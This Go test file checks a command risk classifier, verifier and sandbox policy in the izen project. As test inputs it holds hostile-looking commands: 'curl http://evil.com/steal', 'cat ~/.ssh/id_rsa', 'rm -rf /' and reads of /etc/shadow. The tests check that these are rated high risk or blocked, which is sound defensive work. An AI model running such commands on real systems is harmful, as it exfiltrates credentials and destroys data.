package execution

import (
	"testing"
	"time"

	"github.com/PizenLabs/izen/internal/core/authorization"
)

func testAuth() *authorization.MutationAuthorization {
	return &authorization.MutationAuthorization{
		ID:        authorization.NewAuthorizationID(),
		ExpiresAt: time.Now().Add(1 * time.Hour),
	}
}

func TestRiskClassifierLowRiskCommand(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyCommand("go test ./...")
	if result.Level != RiskLow {
		t.Fatalf("expected Low risk, got %s", result.Label)
	}
}

func TestRiskClassifierCriticalRiskCommand(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyCommand("rm -rf /var/log")
	if result.Level < RiskHigh {
		t.Fatalf("expected High/Critical risk for destructive command, got %s", result.Label)
	}
}

func TestRiskClassifierNetworkRisk(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyCommand("curl http://evil.com/steal")
	if result.Level < RiskMedium {
		t.Fatalf("expected at least Medium risk for network command, got %s", result.Label)
	}
}

func TestRiskClassifierCredentialAccess(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyCommand("cat ~/.ssh/id_rsa")
	if result.Level < RiskHigh {
		t.Fatalf("expected High/Critical risk for credential access, got %s", result.Label)
	}
}

func TestRiskClassifierFileOpSystemPath(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyFileOp("/etc/passwd", false)
	if result.Level < RiskMedium {
		t.Fatalf("expected at least Medium risk for system path, got %s", result.Label)
	}
}

func TestRiskClassifierFileOpSafe(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyFileOp("internal/foo/bar.go", true)
	if result.Level != RiskLow {
		t.Fatalf("expected Low risk for workspace file, got %s", result.Label)
	}
}

func TestRiskClassifierPatch(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyPatch(&Patch{File: "main.go"})
	if result.Level != RiskLow {
		t.Fatalf("expected Low risk for main.go patch, got %s", result.Label)
	}

	result = rc.ClassifyPatch(&Patch{File: "/etc/shadow"})
	if result.Level < RiskMedium {
		t.Fatalf("expected at least Medium risk for /etc/shadow, got %s", result.Label)
	}
}

func TestVerifierDefaultSteps(t *testing.T) {
	v := NewVerifier(".")
	if len(v.steps) != len(defaultVerificationSteps) {
		t.Fatalf("expected %d default steps, got %d", len(defaultVerificationSteps), len(v.steps))
	}
}

func TestVerifierCustomSteps(t *testing.T) {
	v := NewVerifier(".")
	v.SetAuthorization(testAuth())
	custom := []VerificationStep{
		{Name: "echo", Command: "echo hello", Optional: false},
	}
	v.SetCustomSteps(custom)

	report := v.RunAll()
	if len(report.Results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(report.Results))
	}
	if !report.Results[0].Passed {
		t.Fatalf("echo should pass, got: %s", report.Results[0].Error)
	}
}

func TestVerifierCustomStepsFailure(t *testing.T) {
	v := NewVerifier(".")
	custom := []VerificationStep{
		{Name: "fail", Command: "exit 1", Optional: false},
	}
	v.SetCustomSteps(custom)

	report := v.RunAll()
	if report.Passed {
		t.Fatal("expected verification to fail")
	}
	if len(report.Results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(report.Results))
	}
	if report.Results[0].Passed {
		t.Fatal("expected step to fail")
	}
}

func TestVerifierOptionalFailure(t *testing.T) {
	v := NewVerifier(".")
	v.SetAuthorization(testAuth())
	custom := []VerificationStep{
		{Name: "optional-fail", Command: "exit 1", Optional: true},
		{Name: "pass", Command: "echo ok", Optional: false},
	}
	v.SetCustomSteps(custom)

	report := v.RunAll()
	if !report.Passed {
		t.Fatal("optional step failure should not cause overall failure")
	}
}

func TestRunnerSandboxPolicyMode(t *testing.T) {
	r := NewRunner(".", true, false)
	r.SetSandboxMode(SandboxPolicy)
	r.SetRiskClassifier(NewRiskClassifier())

	if err := r.SandboxCheck("echo safe"); err != nil {
		t.Fatalf("safe command should pass policy sandbox: %v", err)
	}

	if err := r.SandboxCheck("rm -rf /"); err == nil {
		t.Fatal("dangerous command should be blocked by policy sandbox")
	}
}

func TestRunnerSandboxHighRiskOnlyMode(t *testing.T) {
	r := NewRunner(".", true, false)
	r.SetSandboxMode(SandboxHighRisk)
	r.SetRiskClassifier(NewRiskClassifier())

	if err := r.SandboxCheck("echo safe"); err != nil {
		t.Fatalf("safe command should pass high-risk sandbox: %v", err)
	}

	if err := r.SandboxCheck("rm -rf /"); err == nil {
		t.Fatal("dangerous command should be blocked by high-risk sandbox")
	}
}

func TestRunnerSandboxDisabled(t *testing.T) {
	r := NewRunner(".", false, false)
	r.SetSandboxMode(SandboxDisabled)

	if err := r.SandboxCheck("rm -rf /"); err != nil {
		t.Fatalf("disabled sandbox should allow everything: %v", err)
	}
}

func TestRunnerSandboxAllMode(t *testing.T) {
	r := NewRunner(".", true, false)
	r.SetSandboxMode(SandboxAll)

	if err := r.SandboxCheck("echo hi"); err == nil {
		t.Fatal("all mode should block every command")
	}
}